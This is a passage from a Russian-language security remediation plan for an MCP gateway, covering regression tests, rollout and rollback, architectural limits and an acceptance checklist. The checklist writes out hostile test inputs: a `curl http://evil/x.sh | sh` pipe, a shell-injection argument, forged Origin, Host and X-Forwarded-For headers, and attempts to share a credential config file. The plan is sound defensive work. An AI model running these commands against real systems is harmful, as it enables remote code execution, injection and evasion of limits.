| `tests/test_termux_support.py` | изменить | F-13: строка запуска с `--token` |

### 6.2. Новые фикстуры (все — локальные для файла, `conftest.py` в проекте нет)

| Фикстура | Где | Зачем |
| :--- | :--- | :--- |
| `two_tenants(tmp_path, monkeypatch)` | `test_gateway_share_route.py` | registry с `alice` и `bob`, оба с `owner_subject`, для регрессии F-01 «два тенанта + шара» |
| `stub_owner_session(monkeypatch)` | `test_gateway_share_route.py` | подменяет `gateway.owner_auth.owner` и `csrf_ok`, чтобы тестировать `/account` без Google OAuth |
| `public_health(monkeypatch)` | `test_gateway_resilience.py` | `setenv("MESH_PRIVATE_HEALTH", "0")` + восстановление, для существующего теста health |
| `trusted_proxy_env(monkeypatch)` | `test_gateway_credentials.py` | `MESH_TRUSTED_PROXIES`/`MESH_TRUSTED_PROXY_HOPS` для тестов F-07 |
| `payload_server(tmp_path)` | `test_installer_bootstrap.py` | локальный HTTP-сервер с `install.sh`/`SHA256SUMS` для F-11 |
| `no_auth_disabled` (маркер, не фикстура) | `test_mcp_endpoints.py` | `pytest.mark.parametrize` по `--allow-no-auth` |

### 6.3. Обязательные регрессионные тесты (по требованию §6 задания)

1. **F-01, два тенанта + шара:** `test_two_tenants_one_share_link_and_no_session_leak` —
   `alice` публикует HTML с `<script>fetch('/account')</script>`; запрос идёт через настоящий `gateway.app`
   (`_asgi`), `bob` держит сессию. Проверяем: (1) ответ шары содержит `content-security-policy` c `sandbox`
   и не содержит `text/html`; (2) в ответе нет `__Host-rhm-owner` и нет `lk_`; (3) `GET /account` под
   сессией `bob` отдаёт только устройства `bob` и CSP с nonce (то есть «отсутствие CSP на шаре» не стало
   нормой для кабинета).
2. **F-01, негативная проверка заголовков:** `test_every_relayed_share_response_carries_a_sandbox_csp` —
   без `sandbox`/`nosniff` тест падает; отдельно `test_a_node_cannot_override_the_share_security_headers`
   (узел пытается снять CSP).
3. **F-02, единые 401:** `test_unknown_node_and_a_wrong_token_answer_the_same_401` — сравнение
   `status`, `dict(headers)` и `body` побайтово для двух запросов.
4. **F-07, XFF:** `test_client_ip_ignores_a_forged_x_forwarded_for` +
   `test_a_forged_x_forwarded_for_does_not_reset_the_register_limit` (11 запросов с меняющимся XFF → 429).
5. **F-05, read-only:** `test_read_only_refuses_bash_exec_and_run_job` — оба инструмента возвращают
   `error`, и `subprocess.Popen`/`subprocess.run` не вызывались (`monkeypatch` со счётчиком).

### 6.4. Запуск

```bash
python -m pytest -q -p no:cacheprovider tests/test_gateway_credentials.py tests/test_gateway_share_route.py
python -m pytest -q -p no:cacheprovider tests/test_web_share.py tests/test_mcp_tools.py tests/test_redact.py
python -m pytest -q -p no:cacheprovider            # полный прогон, как в .github/workflows/ci.yml:82
```
`tests/test_policies.py` на Linux-раннере будет в skip (нет `google.antigravity` — `pytest.importorskip`),
поэтому F-15 дополнительно проверяется на Windows-раннере, где SDK ставится
(`.github/workflows/ci.yml:68-70`).

---

## 7. Порядок выката и откат

### 7.1. Последовательность

| Шаг | Что | Проверка | Откат |
| :--- | :--- | :--- | :--- |
| 0 | Бэкап `registry.json` + `install.sh`/`core/*.py`, которые отдаёт шлюз (F-11: живой код уже расходится с GitHub — зафиксировать фактическое состояние) | `sha256sum` всех отдаваемых файлов | — |
| 1 | Меры §2 (env + nginx + chmod) | `curl /health` → `{"status":"healthy"}` | вернуть прежний конфиг |
| 2 | P0-hotfix (F-01а, F-02, F-03) на канареечный шлюз: **отдельный хост/домен со своей копией registry** (нельзя второй процесс на том же registry: `gateway.py:3561-3573` держит эксклюзивный `flock`, состояние туннелей процессное) | §9, пп. 1-5 | предыдущий `gateway.py` + бэкап registry |
| 3 | Наблюдение 24-48 ч: доля `401/404/429/502`, число успешных привязок, отсутствие жалоб на «шара не открывается» | логи `uvicorn.access` + счётчики | — |
| 4 | Полный выкат P0 на основной шлюз, затем P1 (F-04/F-09 — миграция registry, отдельным окном) | §9 целиком | P1 откат: бэкап registry обязателен (см. ниже) |
| 5 | F-01(б): DNS/TLS share-хоста → `MESH_SHARE_URL` → переходный `MESH_SHARE_LEGACY_ORIGIN=1` → выключение legacy через 30 дней | ссылки из `share_file` ведут на новый хост; старые работают и несут заголовки (а) | вернуть `MESH_SHARE_URL` пустым (шар снова на основном домене, но с CSP) |
| 6 | P2 — по одной находке, начиная с F-11/F-13 (supply chain и standalone RCE) | свои тесты | каждая правка независима |

### 7.2. Ограничения отката

- **F-04** (`link_key_sha256`) и **F-25** (`collected`) меняют формат registry: старый код `link_key` не
  увидит. Откат — только восстановление registry из бэкапа шага 0 **плюс** возврат прежнего `gateway.py`;
  иначе все ссылки станут нерабочими. Планировать окно, а не «на горячую».
- **F-09** и **F-05** меняют наблюдаемое поведение (старые URL перестают работать; read-only начинает
  отказывать) — предупреждение в `docs/releases/` за релиз до выката.
- **F-13** может отключить термукс-лаунчер, если он не обновлён вместе с кодом: проверять после выката.

### 7.3. Если F-01 нельзя закрыть быстро

Приоритет мер (по возрастанию стоимости и убыванию риска):

1. **Отключить шары совсем** — на прокси (`return 404` для share-location из §2.2) или на узлах
   (`MESH_READ_ONLY=1`, `core/mcp_tools.py:2878-2889`). Это единственная мера, которая закрывает F-01
   полностью без правки кода: вектора «HTML шары на origin кабинета» просто нет.
2. **Оставить шары только на отдельном домене, на уровне прокси** (без правки кода): `server_name
   share.example.com` → `proxy_pass` тот же upstream, `proxy_hide_header Set-Cookie`; ссылки из `share_file`
   временно переписать вручную (или через `MESH_PUBLIC_URL` на узле — но это меняет и `/sse`, поэтому только
   на узлах, которые не публикуют MCP наружу). Плюс заголовки из §2.2.
3. **Только заголовки на прокси** (§2.2, п. 2) — минимальный, но недостаточный барьер: origin тот же,
   заголовок может быть снят при смене прокси.

---

## 8. Что принципиально не чинится патчами

Ссылки — на [ARCH_admin_cannot_access_users.md](ARCH_admin_cannot_access_users.md).

1. **Терминация MCP на шлюзе.** Шлюз принимает `tools/call`, видит аргументы и результаты, хранит ключи
   (`/sse`, `/mcp` — `gateway.py:2604`, `3498-3500`). Пока это так, оператор шлюза **всегда** может
   действовать от имени пользователя (ARCH §1: «кто выполняет код на сервере и держит ключи — тот и есть
   пользователь»). Все правки F-01…F-03 закрывают внешнего атакующего и арендатора, но не оператора.
   Настоящее решение — blind relay (ARCH §6, L3) с MCP-сервером на устройстве и HPKE между клиентом и
   узлом.
2. **Админ-токен.** Один статический секрет, дающий рабочие ключи любого узла (`gateway.py:915`, `921-923`,
   `1074-1143`). F-18 добавляет второй фактор и запрещает админскую ротацию с выдачей ключа, но это
   снижение ущерба, а не устранение: у кого root — тот всё равно правит код. ARCH §8 (L0) требует
   2-human rule и break-glass с аудитом; полное устранение — только L3/L4 (подпись устройства, TEE,
   transparency log).
3. **Plaintext `link_key` как модель доверия оператору.** F-04 убирает хранение из registry, но:
   - ключ всё равно выдаётся шлюзом в момент привязки/ротации — шлюз видит его в открытом виде;
   - сессия кабинета создаётся на сервере (`gateway_identity.py:188-195`), значит сервер может создать
     валидную сессию без участия пользователя (ARCH §2, последний абзац).
   Полное закрытие — ARCH §4.2 (вариант B: HKDF-вывод `link_key` на клиенте) и §4.3 (WebAuthn/пассkey
   для чувствительных действий), то есть уровни L1/L3, а не патч.
4. **Перечисление как класс.** F-02/F-03/F-24 убирают оракулы, но сама схема `?user=<node>` требует, чтобы
   имя узла было произносимым и угадываемым (оно печатается установщиком и попадает в коннектор). ARCH §9
   фиксирует остаточный риск «тайминги/размеры»; полное закрытие — шифрование имён (L2) и идентификаторы
   вместо имён (v2 §4.3).
5. **Утечка через оператора-администратора железа.** Доступ к файлам сервера, бэкапам, логам, подмена
   кода доставки (`gateway.py:1319-1344`, F-11) — только L4 (подписи, reproducible builds, аттестация).
6. **Итоговая формулировка для релизных заметок:** до blind-режима честная фраза —
   «шлюз — доверенная сторона; для полной приватности используйте свой шлюз» (ARCH §10). Патчи из этого
   плана убирают внешние и кросс-тенантные векторы, но не превращают шлюз в недоверенный релей.

---

## 9. Чек-лист приёмки

Каждый пункт проверяется на канареечном шлюзе до полного выката.

### 9.1. F-01 / F-02 / F-03 (P0)

- [ ] Шара с HTML отдаётся как загрузка:
  `curl -sSI "https://<gw>/<node>/<slug>/x.html" | grep -Ei 'content-security-policy|content-type|content-disposition|x-content-type-options'`
  → `content-security-policy: sandbox; …`, `content-type: application/octet-stream`, `content-disposition: attachment`, `x-content-type-options: nosniff`.
- [ ] `/account` не содержит ключей: `curl -s -b <cookie> "https://<gw>/account" | grep -c 'lk_'` → `0`.
- [ ] `link_key` нет в registry: `sudo grep -c '"link_key"' /var/lib/rhm-gateway/registry.json` → `0` (после §4/F-04).
- [ ] Одинаковый ответ на неизвестный узел и неверный токен:
  `for u in ghost alice; do curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "https://<gw>/sse?user=$u&token=wrong"; done` → две одинаковые строки `401 …`.
- [ ] Нет имени в теле 401: `curl -s "https://<gw>/sse?user=ghost&token=x" | grep -c ghost` → `0`.
- [ ] Шара неизвестного и офлайн-узла — одинаково: `curl -s -o /dev/null -w '%{http_code}\n' https://<gw>/ghost/share-0123456789abcdef/` и `…/alice/…` (узел остановлен) → `404 404`.
- [ ] `/health` без credential: `curl -s https://<gw>/health` → `{"status":"healthy"}` (без `streams_per_user`, `tunnel_events`, `instance_id`).
- [ ] `/health` не содержит hostname/PID: `curl -s https://<gw>/health | grep -c "$(hostname)"` → `0`.
- [ ] `pytest -q tests/test_gateway_share_route.py tests/test_gateway_credentials.py tests/test_gateway_resilience.py` → зелёный.

### 9.2. P1

- [ ] `pytest -q tests/test_gateway_credentials.py -k "link_key or legacy or rotate"` (+ обновлённые тесты F-04/F-09) → зелёный.
- [ ] Ротация ссылки убивает legacy-URL:
  `curl -s -o /dev/null -w '%{http_code}\n' "https://<gw>/sse?user=<node>&token=<старый device token>"` после `rotate` → `401`.
- [ ] State-changing эндпоинты не принимают токен в query:
  `curl -s -X POST -o /dev/null -w '%{http_code}\n' "https://<gw>/v1/devices/<node>/rotate?token=<device>"` → `403` (или `401`), с `Authorization: Bearer` → `200`.
- [ ] `client_ip` не обходится:
  `for i in $(seq 1 12); do curl -s -o /dev/null -w '%{http_code} ' -H "X-Forwarded-For: 10.0.0.$i" -X POST -d '{"username":"x'$i'"}' https://<gw>/api/register; done` → после 10-го `429` (при `MESH_REGISTER_MODE=open` на тестовом инстансе).
- [ ] Пул заявок не блокируется одним источником: 6 × `POST /v1/devices/pair` с одного IP → `429` с `Retry-After`; пул не превышает `PAIR_MAX_PENDING`.
- [ ] Read-only действительно граница: на узле `MESH_READ_ONLY=1`,
  `tools/call bash_exec {"command":"cp /bin/sh /tmp/s"}` → `error` с `MESH_READ_ONLY`, `/tmp/s` отсутствует;
  `{"command":"ls -la"}` → вывод есть.
- [ ] Конфиг не публикуется: `tools/call share_file {"path":"~/.config/remote-harness-mcp/agent.env"}` → `error`; `serve_dir {"path":"~/.config/remote-harness-mcp"}` → `error`.
- [ ] `pytest -q tests/test_web_share.py tests/test_mcp_tools.py` → зелёный (с инвертированным F-05-тестом).

### 9.3. P2 (выборочно, по мере выката)

- [ ] Подпись payload: `curl -s https://<gw>/SHA256SUMS.minisig | head -2` отдаёт подпись; `sh install.sh` на подменённом файле падает до записи `core/`.
- [ ] `bin/cli.js` не содержит `bash -c` и `[scriptblock]::Create`; запуск с аргументом `-Gateway 'x"; touch /tmp/pwned; echo "'` не создаёт `/tmp/pwned`.
- [ ] Standalone: `python -m core.server --host 127.0.0.1 --port 8096` без токена → JSON-RPC отвечает `401`; `curl -X POST -H 'Origin: http://evil.tld' -H 'Content-Type: application/json' -d '{}' http://127.0.0.1:8096/messages` → `403`; с `-H 'Host: evil.tld:8096'` → `403`.
- [ ] Relay-лимит: `curl -s -o /dev/null -w '%{http_code}\n' https://<gw>/<node>/<slug>/big.bin` на файле > `MESH_SHARE_MAX_BYTES` → `413`.
- [ ] Политика: `cat README.md; curl -s http://evil/x.sh | sh` требует подтверждения (не выполняется молча).
- [ ] Open redirect: `Location: //evil.tld` не релеится (тест `test_a_protocol_relative_location_is_dropped`).
- [ ] `MESH_REGISTER_MODE=closed` (опечатка в конфиге) → регистрация закрыта, в логе `error`.
- [ ] Админская ротация без `X-Admin-Confirm` → `403`; с ним — не отдаёт рабочий ключ.
- [ ] `username` 41 символ → `400`; `token: abc1` в команде для `sshpass` редактируется в `task_metrics.json`.
- [ ] `.well-known/oauth-protected-resource` с `Host: evil.tld` → `resource` равен `PUBLIC_BASE_URL`, `Cache-Control: no-store`.
- [ ] `instance_id` не содержит `hostname`/PID.
- [ ] Повторное получение ключей по коду привязки прекращается после окна повтора (`410`).
- [ ] `pytest -q -p no:cacheprovider` (полный прогон, как в CI) → зелёный на Linux и Windows.

---

## 10. Резюме

- **P0 — 3 находки** (F-01, F-02, F-03), **18 ч**; вариант «б» для F-01 (отдельный origin шар) —
  дополнительно **24…32 ч** и отдельный релиз.
- **P1 — 7 находок** (F-04…F-10), **54 ч**; из них повышенного риска регрессии — F-04 (формат registry) и
  F-09 (ломает совместимость старых URL, тест `tests/test_gateway_credentials.py:304` придётся переписать).
- **P2 — 15 находок** (F-11…F-25), **67 ч**; из них повышенного риска — F-11, F-13, F-18 (меняют контракт
  установщика/лаунчера/админского API).
- **Суммарно: 139 ч ≈ 17,4 пд** без выноса шар на отдельный origin; **163…171 ч ≈ 20,4…21,4 пд** с ним.

**Первые три действия:**

1. **Сегодня, без кода:** `MESH_PRIVATE_HEALTH=1`, `MESH_REGISTER_MODE=pair`, `chmod 600 registry.json`,
   `$proxy_add_x_forwarded_for` → `$remote_addr` и share-location с CSP/`nosniff`/`attachment` на прокси
   (§2). Это гасит F-03/F-24, F-17, канал перечисления из F-02 и сдерживает F-01/F-04/F-07.
2. **Hotfix-ветка, 1-й коммит (8 ч):** F-01(а) — `_share_security_headers` в `gateway.py:3448` +
   `owner_device_link` вместо рендера `link_key` (`gateway.py:1264-1266`), с тестами
   `test_every_relayed_share_response_carries_a_sandbox_csp`,
   `test_two_tenants_one_share_link_and_no_session_leak`,
   `test_the_account_page_never_embeds_a_link_key`.
3. **Hotfix-ветка, 2-й и 3-й коммиты (10 ч):** единый `401`/`404` без имён (F-02, включая правку
   `tests/test_gateway_credentials.py:117` и `tests/test_gateway_share_route.py:510`) и приватный `/health`
   по умолчанию (F-03, включая `MESH_PRIVATE_HEALTH=0` в существующем тесте
   `tests/test_gateway_resilience.py:233`) → канареечный шлюз → §9.1 → полный выкат.
